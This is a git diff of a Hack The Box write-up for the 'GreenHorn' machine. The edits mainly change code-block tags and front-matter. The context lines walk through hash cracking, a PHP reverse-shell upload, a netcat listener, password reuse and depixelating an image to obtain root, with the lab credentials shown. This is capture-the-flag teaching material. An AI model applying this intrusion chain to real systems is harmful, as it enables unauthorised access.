@@ -3,13 +3,14 @@ title: "GreenHorn Writeup"
 date: 2024-07-30T21:50:45-07:00
 tags: ["Hack The Box", "Writeup"]
 toc: true
+description: "GreenHorn is a Hack the Box virtual machine that was released on July 20, 2024. It is an easy linux machine."
 draft: true
-
+image: "images/GreenHorn.png"
 ---
 
 ## Introduction
 
-[GreenHorn is a Hack the Box](https://app.hackthebox.com/machines/GreenHorn) virtual machine that was released on July 20, 2024. It is an easy linux machine.
+[GreenHorn](https://app.hackthebox.com/machines/GreenHorn) is a Hack the Box virtual machine that was released on July 20, 2024. It is an easy linux machine.
 
 <!--more-->
 
@@ -17,7 +18,7 @@ draft: true
 
 We will begin the penetration test with a `nmap` scan of the IP address:
 
-```BashSession
+```Bash
 ┌─[eclectic@parrot]─[~]
 └──╼ $sudo nmap -sC -sV 10.10.11.25
 [sudo] password for eclectic: 
@@ -103,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 149.47 seconds
 
 There is a `ssh` and `http` service running on the server. Lets take a look at the website, but first we need to add the IP and URL to `/etc/hosts`:
 
-```bashsession
+```bash
 ┌─[eclectic@parrot]─[~]
 └──╼ $ echo "10.10.11.25 greenhorn.htb" | sudo tee -a /etc/hosts
 10.10.11.25 greenhorn.htb
@@ -140,7 +141,7 @@ Trying this password in the admin page does not work. If we gain entry into the 
 
 Now I just realized there is a third service running on port `3000`. Going to `10.10.11.25:3000` reveals a [gitea](https://about.gitea.com/) service running. It looks like we can sign up, so I create an account successfully. I can find the `greenhorn` repository on the gitea server. I could try to push a change to the password using the information above to log in, but we can try to crack the hash first:
 
-```bashsession
+```bash
 ┌─[eclectic@parrot]─[~]
 └──╼ $echo 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' > hash2
 ┌─[eclectic@parrot]─[~]
@@ -252,7 +253,7 @@ Trying the password `iloveyou1` on the admin page is successful, and we are gree
 
 Since we have a password, we could try to log in via `ssh`. Checking the repo shows one commit by `junior`,  but our ssh connection is denied due to a public key:
 
-```bashsession
+```bash
 ┌─[eclectic@parrot]─[~/Downloads]
 └──╼ $ssh junior@10.10.11.25
 The authenticity of host '10.10.11.25 (10.10.11.25)' can't be established.
@@ -277,7 +278,7 @@ Now we zip the file and upload it.
 
 Start a netcat listener:
 
-```bashsession
+```bash
 ┌─[eclectic@parrot]─[~/Downloads]
 └──╼ $nc -lvnp 1234
 listening on [any] 1234 ...
@@ -286,7 +287,7 @@ listening on [any] 1234 ...
 
 And now visit the reverse shell location at `http://greenhorn.htb/data/modules/payload/rs.php` and:
 
-```bashsession
+```bash
 ┌─[eclectic@parrot]─[~/Downloads]
 └──╼ $nc -lvnp 1234
 listening on [any] 1234 ...
@@ -305,13 +306,13 @@ We are in.
 
 Checking `/etc/passwd` shows us that `junior` is a user in the system:
 
-```bashsession
+```bash
 junior:x:1000:1000::/home/junior:/bin/bash
 ```
 
 Lets try logging in as `junior`:
 
-```bashsession
+```bash
 www-data@greenhorn:/var/mail$ su - junior
 su - junior
 Password: iloveyou1
@@ -329,7 +330,7 @@ Bingo.
 
 It looks like we cannot run `sudo` commands as `junior`:
 
-```bashsession
+```bash
 junior@greenhorn:~$ sudo -l
 sudo -l
 [sudo] password for junior: iloveyou1
@@ -343,7 +344,7 @@ junior@greenhorn:~$
 
 It looks like there is a PDF in `junior`'s home directory:
 
-```bashsession
+```bash
 junior@greenhorn:~$ ls
 ls
  user.txt  'Using OpenVAS.pdf'
@@ -352,7 +353,7 @@ junior@greenhorn:~$
 
 Start a web server in the home directory and download the pdf via `http://10.10.11.25:8000/Using%20OpenVAS.pdf`:
 
-```bashsession
+```bash
 junior@greenhorn:~$ python3 -m http.server               
 python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -365,7 +366,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 The file shows the following (pasted into a code block by me):
 
-```bashsession
+```bash
 Hello junior,
 
 
@@ -390,7 +391,7 @@ Mr. Green
 
 Oddly, this file does not exist. We cannot create this file ourselves to exploit because we do not have permissions.
 
-```bashsession
+```bash
 ┌─[eclectic@parrot]─[~/Downloads/Depix]
 └──╼ $python3 depix.py -p output-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o unpix.png
 2024-07-26 00:08:21,427 - Loading pixelated image from output-000.ppm
@@ -420,7 +421,7 @@ Oddly, this file does not exist. We cannot create this file ourselves to exploit
 
 The unpixelated image reveals the password to be: `sidefromsidetheothersidesidefromsidetheotherside`
 
-```bashsession
+```bash
 ┌─[✗]─[eclectic@parrot]─[~/Downloads/Depix]
 └──╼ $ssh root@10.10.11.25
 root@10.10.11.25's password: 
@@ -453,4 +454,7 @@ root@greenhorn:~# cat root.txt
 root@greenhorn:~# 
 
 ```
+## Pwned
+
+![](images/pwned.png "Greenhorn Pwned")
 
